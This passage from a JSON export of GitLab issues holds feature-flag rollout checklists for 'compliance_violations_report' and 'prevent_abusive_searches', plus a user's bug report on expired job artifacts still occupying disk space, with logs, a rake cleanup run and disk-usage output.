current milestone.\n- [ ] Set the next milestone to this rollout issue for scheduling [the flag removal](#release-the-feature).\n- [ ] (Optional) You can create a separate issue for scheduling the steps below to [Release the feature](#release-the-feature).\n    - [ ] Set the title to \"[Feature flag] Cleanup `compliance_violations_report`\".\n    - [ ] Execute the `/copy_metadata https://gitlab.com/gitlab-org/gitlab/-/issues/346266` quick action to copy the labels from this rollout issue.\n    - [ ] Link this rollout issue as a related issue.\n    - [ ] Close this rollout issue.\n\n**WARNING:** This approach has the downside that it makes it difficult for us to\n[clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up) the flag.\nFor example, on-premise users could disable the feature on their GitLab instance. But when you\nremove the flag at some point, they suddenly see the feature as enabled and they can't roll it back\nto the previous behavior. To avoid this potential breaking change, use this approach only for urgent\nmatters.\n\n### Release the feature\n\nAfter the feature has been [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release),\nthe [clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up)\nshould be done as soon as possible to permanently enable the feature and reduce complexity in the\ncodebase.\n\n\u003c!-- The checklist here is to help stakeholders keep track of the feature flag status --\u003e\n- [x] Create a merge request to remove `compliance_violations_report` feature flag. Ask for review and merge it.\n    - [x] Remove all references to the feature flag from the codebase.\n    - [x] Remove the YAML definitions for the feature from the repository.\n    - [x] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [x] Ensure that the cleanup MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-cleanup-mr\u003e`\n- [ ] Close [the feature issue](https://gitlab.com/groups/gitlab-org/-/epics/6870) to indicate the feature will be released in the current milestone.\n- [x] Clean up the feature flag from all environments by running these chatops command in `#production` channel:\n    - [x] `/chatops run feature delete compliance_violations_report --dev`\n    - [x] `/chatops run feature delete compliance_violations_report --staging`\n    - [x] `/chatops run feature delete compliance_violations_report`\n- [x] Close this rollout issue.\n\n## Rollback Steps\n\n- [ ] This feature can be disabled by running the following Chatops command:\n\n```\n/chatops run feature set compliance_violations_report false\n```","state":"closed","created_at":"2021-11-22T14:45:03.905Z","updated_at":"2022-04-19T08:48:13.393Z","closed_at":"2022-04-19T08:48:02.932Z","closed_by":{"id":5209897,"username":"rob.hunt","name":"Robert Hunt","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5209897/avatar.png","web_url":"https://gitlab.com/rob.hunt"},"labels":["Category:Compliance Management","Enterprise Edition","GitLab Ultimate","devops::manage","feature flag","frontend","group::compliance","missed:14.9","priority::1","section::dev","type::feature","workflow::in review"],"milestone":{"id":2204142,"iid":72,"group_id":9970,"title":"14.10","description":"","state":"active","created_at":"2021-08-26T19:12:33.701Z","updated_at":"2021-08-26T19:12:33.701Z","due_date":"2022-04-17","start_date":"2022-03-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/72"},"assignees":[{"id":5209897,"username":"rob.hunt","name":"Robert Hunt","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5209897/avatar.png","web_url":"https://gitlab.com/rob.hunt"}],"author":{"id":5209897,"username":"rob.hunt","name":"Robert Hunt","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5209897/avatar.png","web_url":"https://gitlab.com/rob.hunt"},"type":"ISSUE","assignee":{"id":5209897,"username":"rob.hunt","name":"Robert Hunt","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5209897/avatar.png","web_url":"https://gitlab.com/rob.hunt"},"user_notes_count":10,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346266","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":44,"completed_count":27},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"27 of 44 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346266","notes":"https://gitlab.com/api/v4/projects/278964/issues/346266/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346266/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346266","relative":"#346266","full":"gitlab-org/gitlab#346266"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6870,"epic":{"id":364935,"iid":6870,"title":"Compliance report merge request violations frontend MVP","url":"/groups/gitlab-org/-/epics/6870","group_id":9970,"human_readable_end_date":"May 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":97742664,"iid":346263,"project_id":278964,"title":"[Feature flag] Rollout of `prevent_abusive_searches`","description":"\u003c!-- Title suggestion: [Feature flag] Enable description of feature --\u003e\n\n## Summary\n\nThis issue is to rollout [the feature](ISSUE LINK) on production,\nthat is currently behind the `prevent_abusive_searches` feature flag.\n\n\u003c!-- Short description of what the feature is about and link to relevant other issues. --\u003e\n\n## Owners\n\n- Team: ~\"group::global search\" \n- Most appropriate slack channel to reach out to: `#g_global_search`\n- Best individual to reach out to: @john-mason \n- PM: `@JohnMcGuire` \n\n## Stakeholders\n\n\u003c!--\nAre there any other stages or teams involved that need to be kept in the loop?\n\n- Name of a PM\n- The Support Team\n- The Delivery Team\n--\u003e\n\n## Expectations\n\n### What are we expecting to happen?\n\n\u003c!-- Describe the expected outcome when rolling out this feature --\u003e\n\n### When is the feature viable?\n\n\u003c!-- What are the settings we need to configure in order to have this feature viable? --\u003e\n\n\u003c!-- \nExample below:\n \n1. Enable service ping collection\n   `ApplicationSetting.first.update(usage_ping_enabled: true)`\n--\u003e\n\n### What might happen if this goes wrong?\n\n\u003c!-- Should the feature flag be turned off? Any MRs that need to be rolled back? Communication that needs to happen? What are some things you can think of that could go wrong - data loss or broken pages? --\u003e\n\n### What can we monitor to detect problems with this?\n\n\u003c!-- Which dashboards from https://dashboards.gitlab.net are most relevant? --\u003e\n_Consider mentioning checks for 5xx errors or other anomalies like an increase in redirects \n(302 HTTP response status)_\n\n### What can we check for monitoring production after rollouts?\n\n_Consider adding links to check for Sentry errors, Production logs for 5xx, 302s, etc._\n\n## Rollout Steps\n\n### Rollout on non-production environments\n\n- Ensure that the feature MRs have been deployed to non-production environments.\n    - [x] `/chatops run auto_deploy status ce1b174fffac3c769e26b7fda2d1e09501ff11de`\n- [x] Enable the feature globally on non-production environments.\n    - [x] `/chatops run feature set prevent_abusive_searches true --dev`\n    - [x] `/chatops run feature set prevent_abusive_searches true --staging`\n- [x] Verify that the feature works as expected. Posting the QA result in this issue is preferable.\n\n### Specific rollout on production\n\n- Ensure that the feature MRs have been deployed to both production and canary.\n    - [x] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- If you're using [project-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --project=gitlab-org/gitlab \u003cfeature-flag-name\u003e true`\n    - [ ] `/chatops run feature set --project=gitlab-org/gitlab-foss \u003cfeature-flag-name\u003e true`\n    - [ ] `/chatops run feature set --project=gitlab-com/www-gitlab-com \u003cfeature-flag-name\u003e true`\n- If you're using [group-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --group=gitlab-org \u003cfeature-flag-name\u003e true`\n    - [ ] `/chatops run feature set --group=gitlab-com \u003cfeature-flag-name\u003e true`\n- If you're using [user-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [x] `/chatops run feature set --user=\u003cyour-username\u003e \u003cfeature-flag-name\u003e true`\n- [x] Verify that the feature works on the specific entries. Posting the QA result in this issue is preferable.\n\n### Preparation before global rollout\n\n- [x] Check if the feature flag change needs to be accompanied with a\n  [change management issue](https://about.gitlab.com/handbook/engineering/infrastructure/change-management/#feature-flags-and-the-change-management-process).\n  Cross link the issue here if it does.\n- [x] Ensure that you or a representative in development can be available for at least 2 hours after feature flag updates in production.\n  If a different developer will be covering, or an exception is needed, please inform the oncall SRE by using the `@sre-oncall` Slack alias.\n- [x] Ensure that documentation has been updated ([More info](https://docs.gitlab.com/ee/development/documentation/feature_flags.html#features-that-became-enabled-by-default)).\n- [ ] Announce on [the feature issue](ISSUE LINK) an estimated time this will be enabled on GitLab.com.\n- [ ] Notify `#support_gitlab-com` and your team channel ([more guidance when this is necessary in the dev docs](https://docs.gitlab.com/ee/development/feature_flags/controls.html#communicate-the-change)).\n\n### Global rollout on production\n\nFor visibility, all `/chatops` commands that target production should be executed in the `#production` slack channel and cross-posted (with the command results) to the responsible team's slack channel (`#g_TEAM_NAME`).\n\n- [x] [Incrementally roll out](https://docs.gitlab.com/ee/development/feature_flags/controls.html#process) the feature.\n  - If the feature flag in code has [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform **actor-based** rollout.\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e \u003crollout-percentage\u003e --actors`\n  - If the feature flag in code does **NOT** have [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform time-based rollout (**random** rollout).\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e \u003crollout-percentage\u003e`\n  - Enable the feature globally on production environment.\n    - [x] `/chatops run feature set \u003cfeature-flag-name\u003e true`\n- [x] Announce on [the feature issue](ISSUE LINK) that the feature has been globally enabled.\n- [ ] Wait for [at least one day for the verification term](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release).\n\n### (Optional) Release the feature with the feature flag\n\nIf you're still unsure whether the feature is [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release)\nbut want to release it in the current milestone, you can change the default state of the feature flag to be enabled.\nTo do so, follow these steps:\n\n- [ ] Create a merge request with the following changes. Ask for review and merge it.\n    - [ ] Set the `default_enabled` attribute in [the feature flag definition](https://docs.gitlab.com/ee/development/feature_flags/#feature-flag-definition-and-validation) to `true`.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the default-enabling MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-default-enabling-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Set the next milestone to this rollout issue for scheduling [the flag removal](#release-the-feature).\n- [ ] (Optional) You can create a separate issue for scheduling the steps below to [Release the feature](#release-the-feature).\n    - [ ] Set the title to \"[Feature flag] Cleanup `\u003cfeature-flag-name\u003e`\".\n    - [ ] Execute the `/copy_metadata \u003cthis-rollout-issue-link\u003e` quick action to copy the labels from this rollout issue.\n    - [ ] Link this rollout issue as a related issue.\n    - [ ] Close this rollout issue.\n\n**WARNING:** This approach has the downside that it makes it difficult for us to\n[clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up) the flag.\nFor example, on-premise users could disable the feature on their GitLab instance. But when you\nremove the flag at some point, they suddenly see the feature as enabled and they can't roll it back\nto the previous behavior. To avoid this potential breaking change, use this approach only for urgent\nmatters.\n\n### Release the feature\n\nAfter the feature has been [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release),\nthe [clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up)\nshould be done as soon as possible to permanently enable the feature and reduce complexity in the\ncodebase.\n\n\u003c!-- The checklist here is to help stakeholders keep track of the feature flag status --\u003e\n- [ ] Create a merge request to remove `\u003cfeature-flag-name\u003e` feature flag. Ask for review and merge it.\n    - [ ] Remove all references to the feature flag from the codebase.\n      - [ ] Remove the reference to the feature flag in specs `spec/controllers/search_controller_spec.rb` and `spec/services/search_service_spec.rb`\n    - [ ] Remove the YAML definitions for the feature from the repository.\n    - [ ] Remove the reference to the feature flag in the docs here `doc/user/search/advanced_search.md` \n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the cleanup MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-cleanup-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Clean up the feature flag from all environments by running these chatops command in `#production` channel:\n    - [ ] `/chatops run feature delete \u003cfeature-flag-name\u003e --dev`\n    - [ ] `/chatops run feature delete \u003cfeature-flag-name\u003e --staging`\n    - [ ] `/chatops run feature delete \u003cfeature-flag-name\u003e`\n- [ ] Close this rollout issue.\n\n## Rollback Steps\n\n- [ ] This feature can be disabled by running the following Chatops command:\n\n```\n/chatops run feature set \u003cfeature-flag-name\u003e false\n```","state":"closed","created_at":"2021-11-22T14:26:12.347Z","updated_at":"2022-07-21T12:07:31.365Z","closed_at":"2022-07-07T09:53:13.529Z","closed_by":{"id":5054237,"username":"dgruzd","name":"Dmitry Gruzd","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5054237/avatar.png","web_url":"https://gitlab.com/dgruzd"},"labels":["Category:Global Search","Deliverable","devops::data_stores","feature flag","feature::addition","group::global search","needs weight","quad-planning::complete-action","section::enablement","type::maintenance","workflow::in review"],"milestone":{"id":2453024,"iid":74,"group_id":9970,"title":"15.2","description":"","state":"active","created_at":"2022-02-03T22:24:46.818Z","updated_at":"2022-02-03T22:26:32.010Z","due_date":"2022-07-17","start_date":"2022-06-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/74"},"assignees":[{"id":5054237,"username":"dgruzd","name":"Dmitry Gruzd","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5054237/avatar.png","web_url":"https://gitlab.com/dgruzd"}],"author":{"id":9717668,"username":"john-mason","name":"John Mason","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9717668/avatar.png","web_url":"https://gitlab.com/john-mason"},"type":"ISSUE","assignee":{"id":5054237,"username":"dgruzd","name":"Dmitry Gruzd","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5054237/avatar.png","web_url":"https://gitlab.com/dgruzd"},"user_notes_count":12,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346263","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":51,"completed_count":14},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"14 of 51 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346263","notes":"https://gitlab.com/api/v4/projects/278964/issues/346263/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346263/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346263","relative":"#346263","full":"gitlab-org/gitlab#346263"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":97739734,"iid":346261,"project_id":278964,"title":"Expired artifacts still taking disk space","description":"## **If you are experiencing this bug, upgrade to 14.9**\n\nThis issue will be closed when we implement back ports for 14.6,14.7, and 14.8\n\n### Summary\n\nWe are experiencing high disk usage in the artifact storage (local) even if artifacts are correctly marked as expired. In the UI we see that some build artifacts are no longer available, but they are still present on disk.\n\n### Steps to reproduce\n\nI have no easy reproduction step as the issue seems to be happening only on some builds, apparently by random chance. I can run any additional check you may suggest in order to better understand what's happening.\n\nAs a side note, we updated to Gitlab 14.4 just today. Those older builds were executed on Gitlab 13.10.\n\n### What is the current *bug* behavior?\n\nMost of my jobs have the `expire_in: 2h` clause - the rest are marked with `expire_in: 1 week` . No artifact should ever be stored for more than a week. Build artifacts seem to expire correctly, but sometimes they are not removed from disk. \n\n### What is the expected *correct* behavior?\n\nArtifacts should be removed shortly after expiration, reclaiming their used disk space.\n\n### Relevant logs and/or screenshots\n\nThe `ExpireBuildArtifactsWorker` cronjob is running correctly every 7 minutes (the default scheduling):\n```\n# cat /var/log/gitlab/sidekiq/current | grep ExpireBuildArtifactsWorker\n{\"severity\":\"INFO\",\"time\":\"2021-11-22T12:00:07.834Z\",\"queue\":\"cronjob:expire_build_artifacts\",\"args\":[],\"class\":\"ExpireBuildArtifactsWorker\",\"retry\":0,\"version\":0,\"queue_namespace\":\"cronjob\",\"jid\":\"1a39b76097110c3ef7badcde\",\"created_at\":\"2021-11-22T12:00:07.720Z\",\"meta.caller_id\":\"Cronjob\",\"correlation_id\":\"d587da0be9acf30a9d8317b13da780df\",\"idempotency_key\":\"resque:gitlab:duplicate:cronjob:expire_build_artifacts:7e864f760219ae33143ba929fea73d2c9117919da80b189f87db84994980be48\",\"enqueued_at\":\"2021-11-22T12:00:07.721Z\",\"job_size_bytes\":2,\"pid\":1644679,\"message\":\"ExpireBuildArtifactsWorker JID-1a39b76097110c3ef7badcde: start\",\"job_status\":\"start\",\"scheduling_latency_s\":0.113121}\n{\"severity\":\"INFO\",\"time\":\"2021-11-22T12:00:07.951Z\",\"class\":\"Namespaces::ScheduleAggregationWorker\",\"args\":[\"113\"],\"retry\":3,\"queue\":\"update_namespace_statistics:namespaces_schedule_aggregation\",\"version\":0,\"queue_namespace\":\"update_namespace_statistics\",\"jid\":\"de3e0a811e407584784417ca\",\"created_at\":\"2021-11-22T12:00:07.948Z\",\"meta.caller_id\":\"ExpireBuildArtifactsWorker\",\"meta.feature_category\":\"continuous_integration\",\"meta.client_id\":\"ip/\",\"correlation_id\":\"d587da0be9acf30a9d8317b13da780df\",\"idempotency_key\":\"resque:gitlab:duplicate:update_namespace_statistics:namespaces_schedule_aggregation:a48ed0441003298938285446a1beea7d3de501a28f4d771fef87bc1ae9c7ddc1\",\"enqueued_at\":\"2021-11-22T12:00:07.949Z\",\"job_size_bytes\":5,\"pid\":1644679,\"message\":\"Namespaces::ScheduleAggregationWorker JID-de3e0a811e407584784417ca: start\",\"job_status\":\"start\",\"scheduling_latency_s\":0.001676}\n{\"severity\":\"INFO\",\"time\":\"2021-11-22T12:00:07.961Z\",\"class\":\"Namespaces::ScheduleAggregationWorker\",\"args\":[\"113\"],\"retry\":3,\"queue\":\"update_namespace_statistics:namespaces_schedule_aggregation\",\"version\":0,\"queue_namespace\":\"update_namespace_statistics\",\"jid\":\"de3e0a811e407584784417ca\",\"created_at\":\"2021-11-22T12:00:07.948Z\",\"meta.caller_id\":\"ExpireBuildArtifactsWorker\",\"meta.feature_category\":\"continuous_integration\",\"meta.client_id\":\"ip/\",\"correlation_id\":\"d587da0be9acf30a9d8317b13da780df\",\"idempotency_key\":\"resque:gitlab:duplicate:update_namespace_statistics:namespaces_schedule_aggregation:a48ed0441003298938285446a1beea7d3de501a28f4d771fef87bc1ae9c7ddc1\",\"enqueued_at\":\"2021-11-22T12:00:07.949Z\",\"job_size_bytes\":5,\"pid\":1644679,\"message\":\"Namespaces::ScheduleAggregationWorker JID-de3e0a811e407584784417ca: done: 0.010041 sec\",\"job_status\":\"done\",\"scheduling_latency_s\":0.001676,\"redis_calls\":2,\"redis_duration_s\":0.000381,\"redis_read_bytes\":2,\"redis_write_bytes\":228,\"redis_queues_calls\":2,\"redis_queues_duration_s\":0.000381,\"redis_queues_read_bytes\":2,\"redis_queues_write_bytes\":228,\"db_count\":2,\"db_write_count\":0,\"db_cached_count\":0,\"cpu_s\":0.004016,\"mem_objects\":998,\"mem_bytes\":34056,\"mem_mallocs\":141,\"mem_total_bytes\":73976,\"duration_s\":0.010041,\"completed_at\":\"2021-11-22T12:00:07.961Z\",\"db_duration_s\":0.004639}\n{\"severity\":\"INFO\",\"time\":\"2021-11-22T12:00:09.807Z\",\"queue\":\"cronjob:expire_build_artifacts\",\"args\":[],\"class\":\"ExpireBuildArtifactsWorker\",\"retry\":0,\"version\":0,\"queue_namespace\":\"cronjob\",\"jid\":\"1a39b76097110c3ef7badcde\",\"created_at\":\"2021-11-22T12:00:07.720Z\",\"meta.caller_id\":\"Cronjob\",\"correlation_id\":\"d587da0be9acf30a9d8317b13da780df\",\"idempotency_key\":\"resque:gitlab:duplicate:cronjob:expire_build_artifacts:7e864f760219ae33143ba929fea73d2c9117919da80b189f87db84994980be48\",\"enqueued_at\":\"2021-11-22T12:00:07.721Z\",\"job_size_bytes\":2,\"pid\":1644679,\"message\":\"ExpireBuildArtifactsWorker JID-1a39b76097110c3ef7badcde: done: 1.972892 sec\",\"job_status\":\"done\",\"scheduling_latency_s\":0.113121,\"redis_calls\":6,\"redis_duration_s\":0.006063000000000001,\"redis_read_bytes\":265,\"redis_write_bytes\":1822,\"redis_cache_calls\":1,\"redis_cache_duration_s\":0.000126,\"redis_cache_read_bytes\":203,\"redis_cache_write_bytes\":62,\"redis_queues_calls\":3,\"redis_queues_duration_s\":0.005629,\"redis_queues_read_bytes\":60,\"redis_queues_write_bytes\":1456,\"redis_shared_state_calls\":2,\"redis_shared_state_duration_s\":0.000308,\"redis_shared_state_read_bytes\":2,\"redis_shared_state_write_bytes\":304,\"db_count\":2009,\"db_write_count\":5,\"db_cached_count\":1988,\"cpu_s\":1.794631,\"mem_objects\":1135121,\"mem_bytes\":17260672,\"mem_mallocs\":254581,\"mem_total_bytes\":62665512,\"extra.expire_build_artifacts_worker.destroyed_job_artifacts_count\":2,\"duration_s\":1.972892,\"completed_at\":\"2021-11-22T12:00:09.807Z\",\"db_duration_s\":0.131203}\n```\n\n### Output of checks\n\nThe orphan cleanup job does not find anything relevant:\n```\nlscorcia@MOPAPGITLAB01:~$ sudo gitlab-rake gitlab:cleanup:orphan_job_artifact_files DRY_RUN=false\nI, [2021-11-22T12:48:51.036823 #1676957]  INFO -- :  Looking for orphan job artifacts to clean up\nI, [2021-11-22T12:48:51.037377 #1676957]  INFO -- :  find command: '/bin/ionice -c best-effort find -L /var/opt/gitlab/gitlab-rails/shared/artifacts -mindepth 6 -maxdepth 6 -type d'\nI, [2021-11-22T12:48:51.486441 #1676957]  INFO -- :  Processed 12955 job artifact(s) to find and cleaned 0 orphan(s).\n```\n\nHowever, if I run the following script in the Rails console, I see a bunch of items that should be expired:\n```\nproject = Project.find_by_full_path('mypath/myproject')\nbuilds_with_artifacts =  project.builds.with_downloadable_artifacts\nbuilds_to_clear = builds_with_artifacts.where(\"finished_at \u003c ?\", 2.week.ago)\nbuilds_to_clear.find_each do |build|\n  puts build.artifacts_expire_at \nend\n```\n\n```\n2021-08-25 18:37:31 UTC\n2021-08-25 18:35:05 UTC\n2021-09-01 16:47:07 UTC\n2021-08-25 20:41:45 UTC\n2021-08-25 20:43:59 UTC\n2021-09-01 18:54:07 UTC\n2021-08-26 21:53:23 UTC\n2021-08-26 21:51:33 UTC\n2021-09-02 20:03:35 UTC\n2021-09-01 15:57:52 UTC\n2021-09-01 16:00:44 UTC\n2021-09-08 14:11:36 UTC\n2021-09-01 17:48:03 UTC\n2021-09-01 17:50:27 UTC\n2021-09-08 16:01:06 UTC\n2021-09-02 14:28:22 UTC\n2021-09-02 14:50:46 UTC\n2021-09-09 13:00:37 UTC\n2021-09-03 15:43:30 UTC\n2021-09-03 15:45:52 UTC\n2021-09-10 13:56:03 UTC\n2021-09-08 20:26:32 UTC\n2021-09-08 20:29:04 UTC\n2021-09-15 18:38:52 UTC\n2021-10-19 23:31:51 UTC\n2021-10-19 23:34:44 UTC\n2021-10-20 20:35:31 UTC\n2021-10-20 20:42:10 UTC\n2021-10-20 20:43:55 UTC\n2021-10-26 23:32:33 UTC\n2021-10-26 23:35:55 UTC\n2021-10-26 23:27:55 UTC\n```\n\nHowever, in the UI those very same builds are marked as `No artifacts found` (see attached image) in the Pipelines screen:\n\n![immagine](/uploads/b7d089a24b7350ada2b06fd8dfed1398/immagine.png)\n\nThis is a report of disk usage for the `/var/opt/gitlab/gitlab-rails/shared/artifacts` folder:\n```\n# du -a . | sort -n -r | head -n 50\n74653360        .\n28496036        ./86\n28496032        ./86/e5\n28496028        ./86/e5/86e50149658661312a9e0b35558d84f6c6d3da797f552a9657fe0558ca40cdef\n25633164        ./8e\n25633160        ./8e/61\n25633156        ./8e/61/8e612bd1f5d132a339575b8dafb7842c64614e56bcf3d5ab65a0bc4b34329407\n5489668 ./86/e5/86e50149658661312a9e0b35558d84f6c6d3da797f552a9657fe0558ca40cdef/2021_08_25\n5485552 ./86/e5/86e50149658661312a9e0b35558d84f6c6d3da797f552a9657fe0558ca40cdef/2021_09_01\n4207000 ./8c\n4206996 ./8c/d2\n4206992 ./8c/d2/8cd2510271575d8430c05368315a87b9c4784c7389a47496080c1e615a2a00b6\n2762496 ./86/e5/86e50149658661312a9e0b35558d84f6c6d3da797f552a9657fe0558ca40cdef/2021_09_02\n2758380 ./86/e5/86e50149658661312a9e0b35558d84f6c6d3da797f552a9657fe0558ca40cdef/2021_09_08\n2754876 ./86/e5/86e50149658661312a9e0b35558d84f6c6d3da797f552a9657fe0558ca40cdef/2021_09_03\n2743088 ./86/e5/86e50149658661312a9e0b35558d84f6c6d3da797f552a9657fe0558ca40cdef/2021_08_26\n1984740 ./8e/61/8e612bd1f5d132a339575b8dafb7842c64614e56bcf3d5ab65a0bc4b34329407/2021_11_12\n1751148 ./4a\n1751144 ./4a/85\n1751140 ./4a/85/4a8596a7790b5ca9e067da401c018b3206befbcf95c38121854d1a0158e7678a\n1699104 ./73\n1690196 ./73/4d\n1690192 ./73/4d/734d0759cdb4e0d0a35e4fd73749aee287e4fdcc8648b71a8d6ed591b7d4cb3f\n1651024 ./cb\n1651020 ./cb/a2\n1651016 ./cb/a2/cba28b89eb859497f544956d64cf2ecf29b76fe2ef7175b33ea59e64293a4461\n1612408 ./5e\n1612404 ./5e/f6\n1612400 ./5e/f6/5ef6fdf32513aa7cd11f72beccf132b9224d33f271471fff402742887a171edf\n1586532 ./86/e5/86e50149658661312a9e0b35558d84f6c6d3da797f552a9657fe0558ca40cdef/2021_11_22\n1512348 ./86/e5/86e50149658661312a9e0b35558d84f6c6d3da797f552a9657fe0558ca40cdef/2021_10_26\n1501992 ./86/e5/86e50149658661312a9e0b35558d84f6c6d3da797f552a9657fe0558ca40cdef/2021_10_20\n1479536 ./65\n1479532 ./65/a6\n1479528 ./65/a6/65a699905c02619370bcf9207f5a477c3d67130ca71ec6f750e07fe8d510b084\n1400136 ./7b\n1400132 ./7b/69\n1400128 ./7b/69/7b69759630f869f2723875f873935fed29d2d12b10ef763c1c33b8e0004cb405\n1367336 ./86/e5/86e50149658661312a9e0b35558d84f6c6d3da797f552a9657fe0558ca40cdef/2021_09_08/28367\n1367144 ./86/e5/86e50149658661312a9e0b35558d84f6c6d3da797f552a9657fe0558ca40cdef/2021_09_08/28367/43117\n```\n\n#### Results of GitLab environment info\n\nGitLab Community on-premises setup.\n\n\u003cdetails\u003e\n\u003csummary\u003eExpand for output related to GitLab environment info\u003c/summary\u003e\n\n\u003cpre\u003e\nSystem information\nSystem:         Ubuntu 20.04\nCurrent User:   git\nUsing RVM:      no\nRuby Version:   2.7.4p191\nGem Version:    3.1.4\nBundler Version:2.1.4\nRake Version:   13.0.6\nRedis Version:  6.0.16\nGit Version:    2.33.0.\nSidekiq Version:6.2.2\nGo Version:     unknown\n\nGitLab information\nVersion:        14.4.2\nRevision:       1ce86e92f81\nDirectory:      /opt/gitlab/embedded/service/gitlab-rails\nDB Adapter:     PostgreSQL\nDB Version:     12.7\nURL:            https://gitlab.mydomain.com\nHTTP Clone URL: https://gitlab.mydomain.com/some-group/some-project.git\nSSH Clone URL:  git@gitlab.mydomain.com:some-group/some-project.git\nUsing LDAP:     yes\nUsing Omniauth: yes\nOmniauth Providers: openid_connect\n\nGitLab Shell\nVersion:        13.21.1\nRepository storage paths:\n- default:      /var/opt/gitlab/git-data/repositories\nGitLab Shell path:              /opt/gitlab/embedded/service/gitlab-shell\nGit:            /opt/gitlab/embedded/bin/git\n\u003c/pre\u003e\n\u003c/details\u003e\n\n#### Results of GitLab application Check\n\n\u003cdetails\u003e\n\u003csummary\u003eExpand for output related to the GitLab application check\u003c/summary\u003e\n\u003cpre\u003e\nInternal API available: OK\nRedis available via internal API: OK\ngitlab-shell self-check successful\n\nChecking GitLab Shell ... Finished\n\nChecking Gitaly ...\n\nGitaly: ... default ... OK\n\nChecking Gitaly ... Finished\n\nChecking Sidekiq ...\n\nSidekiq: ... Running? ... yes\nNumber of Sidekiq processes (cluster/worker) ... 1/1\n\nChecking Sidekiq ... Finished\n\nChecking Incoming Email ...\n\nIncoming Email: ... Checking Reply by email ...\n\nIMAP server credentials are correct? ... Checking gitlab@mydomain.com\nyes\nInit.d configured correctly? ... skipped\nMailRoom running? ... skipped\n\nChecking Reply by email ... Finished\n\n\nChecking Incoming Email ... Finished\n\nChecking LDAP ...\n\nLDAP: ... Server: ldapmain\nLDAP authentication... Success\nLDAP users with access to your GitLab server (only showing the first 100 results)\n        User output sanitized. Found 100 users of 100 limit.\n\nChecking LDAP ... Finished\n\nChecking GitLab App 